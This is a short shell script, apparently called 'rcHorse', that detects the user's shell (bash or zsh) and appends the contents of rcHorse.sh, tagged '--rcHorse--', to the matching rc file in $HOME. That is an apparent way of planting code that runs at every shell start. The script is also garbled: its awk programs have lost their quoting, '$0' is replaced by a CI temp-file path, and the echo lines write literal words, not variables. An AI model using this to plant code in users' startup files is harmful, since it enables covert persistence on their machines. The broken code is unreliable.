
case $(basename $SHELL) in  
	"bash")                 
		target="bashrc"     
		;;                  
	"zsh")                  
		target="zshrc"      
        ;;                  
    *)                      
		exit                
esac                        
bashrc="$(awk !=#--rcHorse-- {print /home/runner/work/_temp/78218eb6-0e6e-42d6-8544-a2bfc15b3008.sh} $HOME/$target)"                      
horse=$(awk {print /home/runner/work/_temp/78218eb6-0e6e-42d6-8544-a2bfc15b3008.sh  #--rcHorse--} rcHorse.sh | sed "s/rcTarget/$target/")    
echo bashrc >> $HOME/$target    
echo horse >> $HOME/$target     
